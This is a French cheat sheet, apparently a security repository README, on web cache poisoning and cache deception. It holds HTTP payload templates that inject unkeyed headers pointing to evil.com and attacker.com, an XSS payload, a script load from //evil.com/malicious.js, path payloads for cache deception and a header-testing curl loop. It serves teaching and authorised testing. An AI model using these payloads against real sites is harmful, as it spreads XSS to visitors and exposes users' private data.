# 💾 Aide-mémoire sur l’empoisonnement du cache web

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.it.md">🇮🇹 Versione Italiana</a> | <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 Qu’est-ce que l’empoisonnement du cache ?

L’**empoisonnement du cache web** (*web cache poisoning*) exploite le fonctionnement du cache pour y stocker des réponses malveillantes, qui sont ensuite transmises à d’autres utilisateurs.

### Conséquences
- 🔴 **XSS à grande échelle** — XSS stockée diffusée à tous les utilisateurs
- 🔴 **Défiguration** (*defacement*) — Mise en cache de contenu malveillant
- 🔴 **Déni de service (DoS)** — Mise en cache de réponses d’erreur
- 🔴 **Attaques par redirection** — Redirection des utilisateurs

---

## 🔍 Comprendre la mise en cache

### Clés de cache
```
# Éléments généralement utilisés pour la mise en cache :
URL + en-tête Host

# Éléments NON inclus dans la clé (unkeyed) :
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
En-têtes personnalisés
```

> **Précision :** ce schéma est simplifié. La clé de cache repose au minimum sur la méthode et l’URI cible ; `Vary` ou la configuration peuvent y ajouter des en-têtes. « Unkeyed » désigne une entrée exclue de cette clé, selon le cache concerné ([RFC 9111, § 2](https://www.rfc-editor.org/rfc/rfc9111.html#section-2)).

### Repérer la mise en cache
```bash
# Rechercher les en-têtes liés au cache
curl -I https://target.com

# Indicateurs de mise en cache :
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

> **Précision :** `Cache-Control` décrit une politique ; sa présence seule ne prouve pas que cette réponse a été servie depuis un cache ([RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html)).

---

## 💉 Injection d’en-têtes exclus de la clé de cache

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Si la réponse reprend evil.com :
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Peut provoquer une redirection ou une confusion de protocole
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Vérifier si la valeur est reprise dans la réponse
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Contourner les restrictions sur les chemins
```

---

## 🔥 Techniques d’attaque

### XSS par empoisonnement du cache : exemple simple
```http
# 1. Trouver une entrée exclue de la clé et reprise dans la réponse
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. La réponse contenant la XSS est mise en cache
# 3. Tous les utilisateurs reçoivent la XSS depuis le cache
```

### Empoisonnement du cache par le chemin
```http
# Requête avec des chemins différents côté serveur d’origine
GET /page;evil HTTP/1.1
Host: target.com

# Peut être mise en cache avec une clé différente de celle attendue
```

### Requêtes GET avec un corps (fat GET)
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# Le corps peut influencer la réponse sans être inclus dans la clé de cache
```

> **Précision :** l’exemple original est conservé : `Content-Length: 25` ne correspond pas aux 31 octets ASCII de `callback=alert(document.domain)` sans saut de ligne final. Un corps de GET n’a pas de sémantique générale et certaines implémentations le rejettent ([RFC 9110, § 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.1)).

### Dissimulation de paramètres (parameter cloaking)
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Analyse différente entre le cache et l’application
```

> **Précision :** cet exemple illustre une divergence d’analyse ; le traitement de `;` dépend des versions et des composants. Il ne faut pas supposer ce comportement pour toute application Ruby on Rails ([PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-parameter-cloaking)).

---

## 🛠️ Tromperie du cache web (web cache deception)

### À distinguer de l’empoisonnement !
```
# Empoisonnement : le payload de l’attaquant est mis en cache pour les victimes
# Tromperie : les données de la victime sont mises en cache pour l’attaquant

# Étapes d’une attaque par tromperie du cache web :
1. Inciter la victime à consulter : /account/settings.css
2. Le serveur renvoie /account/settings (en ignorant .css)
3. Le cache stocke la réponse comme une ressource publique
4. L’attaquant récupère /account/settings.css depuis le cache
5. Il obtient les données sensibles de la victime
```

### Payloads (charges utiles)
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

## 📊 Technique du paramètre de séparation du cache (cache buster)

### Pour les tests
```http
# Ajouter un cache buster pour éviter d’affecter les autres utilisateurs
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Chaque test obtient une clé de cache unique
```

> **Précision :** le paramètre `cb` ne sépare les entrées que s’il participe effectivement à la clé ; certains caches ignorent la chaîne de requête ou certains paramètres ([PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#unkeyed-query-string)).

---

## 🛠️ Outils

### Param Miner (extension Burp)
```
1. Installer Param Miner depuis le BApp Store
2. Faire un clic droit sur la requête → Extensions → Param Miner
3. Choisir « Guess headers »
4. Rechercher les en-têtes exclus de la clé de cache
```

### Tests manuels
```bash
# Tester les en-têtes
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

## 📋 En-têtes souvent exclus de la clé de cache

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

## 📚 Ressources

- [Empoisonnement du cache web — PortSwigger](https://portswigger.net/web-security/web-cache-poisoning)
- [Recherche PortSwigger](https://portswigger.net/research/practical-web-cache-poisoning)
- [Tromperie du cache web](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 Empoisonnez le cache !</b><br>
  <i>Uniquement pour des tests autorisés !</i>
</p>
